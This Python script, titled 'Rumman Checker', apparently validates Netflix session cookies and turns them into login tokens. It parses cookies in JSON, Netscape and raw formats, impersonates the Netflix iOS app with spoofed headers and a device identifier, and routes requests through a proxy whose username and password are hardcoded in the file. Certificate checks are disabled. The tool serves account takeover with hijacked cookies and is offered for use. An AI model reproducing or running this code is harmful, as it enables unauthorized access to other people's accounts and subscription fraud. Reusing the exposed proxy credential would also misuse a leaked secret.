#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Rumman Checker - Netflix Cookie Checker
Vercel-compatible version with proxy support
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import base64
from datetime import datetime, timedelta, timezone
from typing import Tuple, Optional, Dict, List, Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# PROXY CONFIGURATION - USING YOUR PROXY
# ============================================

PROXY_URL = "http://yh63obxwk:vJxdWjQEve7iLG_CzcakWW@beta.strikeproxy.net:8080"

# ============================================

DEBUG = True

MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
YOUR_ACCOUNT_URL = "https://www.netflix.com/YourAccount"

# ==================================================
# UTILITIES
# ==================================================

def decode_value(value: Any) -> Optional[str]:
    if value is None:
        return None
    cleaned = str(value)
    cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = cleaned.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned if cleaned else None

def clean_phone_number(phone: str) -> str:
    if not phone:
        return ""
    has_plus = phone.strip().startswith('+')
    digits = re.sub(r'\D', '', phone)
    if has_plus and digits:
        return f"+{digits}"
    return digits

# ==================================================
# COOKIE PARSING
# ==================================================

def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
    bundles = []
    
    try:
        data = json.loads(content)
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get('cookies', [data])
        else:
            items = []
        
        cookie_sets = {}
        for item in items:
            if isinstance(item, dict):
                name = item.get('name')
                value = item.get('value')
                if name and value:
                    idx = item.get('index', 0)
                    if idx not in cookie_sets:
                        cookie_sets[idx] = {}
                    cookie_sets[idx][name] = value
        
        for idx, cookies in cookie_sets.items():
            if 'NetflixId' in cookies:
                netscape_lines = []
                for name, value in cookies.items():
                    domain = '.netflix.com'
                    secure = 'TRUE' if name == 'SecureNetflixId' else 'FALSE'
                    netscape_lines.append(f"{domain}\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
                netscape_content = "\n".join(netscape_lines)
                bundles.append((cookies, netscape_content, {}))
    except:
        pass
    
    if not bundles:
        blocks = re.split(r'\n\s*\n', content.strip())
        for block in blocks:
            if not block.strip():
                continue
            cookies = {}
            netscape_lines = []
            for line in block.splitlines():
                line = line.strip()
                if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                    continue
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    name = parts[5]
                    value = parts[6]
                    if 'netflix' in domain.lower():
                        cookies[name] = value
                        netscape_lines.append(line)
            if 'NetflixId' in cookies:
                bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    if not bundles:
        cookies = {}
        netscape_lines = []
        patterns = {
            'NetflixId': r'NetflixId[=:"]+([^";\s]+)',
            'SecureNetflixId': r'SecureNetflixId[=:"]+([^";\s]+)',
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                cookies[name] = match.group(1)
                netscape_lines.append(f".netflix.com\tTRUE\t/\t{name == 'SecureNetflixId'}\t0\t{name}\t{match.group(1)}")
        if 'NetflixId' in cookies:
            bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    return bundles

# ==================================================
# NFTOKEN GENERATION - WITH PROXY
# ==================================================

def get_proxies() -> Optional[Dict[str, str]]:
    """Get proxy dict from PROXY_URL"""
    if PROXY_URL and PROXY_URL.strip():
        return {
            'http': PROXY_URL,
            'https': PROXY_URL,
        }
    return None

def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
    netflix_id = cookies.get('NetflixId')
    if not netflix_id:
        print("❌ No NetflixId found in cookies")
        return None
    
    print(f"🔄 Requesting NFToken for NetflixId: {netflix_id[:30]}...")
    print(f"🔄 Using proxy: {PROXY_URL.split('@')[-1] if '@' in PROXY_URL else PROXY_URL}")
    
    try:
        token = get_token_via_api(netflix_id)
        if token:
            expires = datetime.now(timezone.utc) + timedelta(hours=1)
            return {
                'token': token,
                'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
            }
    except Exception as e:
        print(f"⚠️ API approach failed: {e}")
    
    return None

def get_token_via_api(netflix_id: str) -> Optional[str]:
    """Get token via the iOS API with proxy support"""
    
    # Clean the NetflixId
    if netflix_id.startswith('v%3D3%26ct%3D'):
        pass
    elif 'ct%3D' in netflix_id:
        match = re.search(r'ct%3D([^&%]+)', netflix_id)
        if match:
            netflix_id = 'v%3D3%26ct%3D' + match.group(1)
    
    headers = {
        'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
        'Accept': 'application/json',
        'Accept-Language': 'en-US;q=1',
        'x-netflix.request.attempt': '1',
        'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': '15.48.1',
        'x-netflix.argo.translated': 'true',
        'x-netflix.context.form-factor': 'phone',
        'x-netflix.context.sdk-version': '2012.4',
        'x-netflix.client.appversion': '15.48.1',
        'x-netflix.context.max-device-width': '375',
        'x-netflix.client.type': 'argo',
        'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        'x-netflix.context.locales': 'en-US',
        'x-netflix.client.iosversion': '15.8.5',
        'x-netflix.argo.abtests': '',
        'x-netflix.context.os-version': '15.8.5',
        'x-netflix.context.ui-flavor': 'argo',
        'x-netflix.argo.nfnsm': '9',
        'x-netflix.context.pixel-density': '2.0',
        'Cookie': f'NetflixId={netflix_id}'
    }
    
    params = {
        'appVersion': '15.48.1',
        'config': '{"gamesInTrailersEnabled":"false"}',
        'device_type': 'NFAPPL-02-',
        'esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        'idiom': 'phone',
        'iosVersion': '15.8.5',
        'isTablet': 'false',
        'languages': 'en-US',
        'locale': 'en-US',
        'maxDeviceWidth': '375',
        'model': 'saget',
        'modelType': 'IPHONE8-1',
        'odpAware': 'true',
        'path': '["account","token","default"]',
        'pathFormat': 'graph',
        'pixelDensity': '2.0',
        'progressive': 'false',
        'responseFormat': 'json',
    }
    
    proxies = get_proxies()
    
    try:
        response = requests.get(
            'https://ios.prod.ftl.netflix.com/iosui/user/15.48',
            params=params,
            headers=headers,
            proxies=proxies,
            timeout=15,
            verify=False
        )
        
        print(f"📡 API Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            token_data = (((data.get('value') or {}).get('account') or {}).get('token') or {}).get('default') or {}
            token = token_data.get('token')
            if token:
                print(f"✅ Token generated! Length: {len(token)}")
                return token
            else:
                print("⚠️ No token in response")
                if DEBUG:
                    print(f"Response: {json.dumps(data, indent=2)[:500]}")
        elif response.status_code == 403:
            print("❌ Access denied - proxy might be blocked by Netflix")
        elif response.status_code == 429:
            print("❌ Rate limited - too many requests")
        else:
            print(f"❌ API returned: {response.status_code}")
            if DEBUG and response.text:
                print(f"Response: {response.text[:200]}")
                
    except requests.exceptions.Timeout:
        print("❌ Request timed out")
    except requests.exceptions.ProxyError as e:
        print(f"❌ Proxy error: {e}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    return None

def generate_token_from_cookie(cookie_content: str) -> Optional[Dict]:
    """Generate token from cookie content"""
    bundles = extract_cookie_bundles(cookie_content)
    print(f"📦 Found {len(bundles)} cookie bundles")
    
    for cookies, netscape, info in bundles:
        if 'NetflixId' in cookies:
            print("🔑 Found NetflixId, attempting token generation...")
            token_data = create_nftoken(cookies)
            if token_data:
                return {
                    'token': token_data.get('token'),
                    'expires_at_utc': token_data.get('expires_at_utc'),
                    'cookies': cookies,
                    'info': info
                }
    
    return None
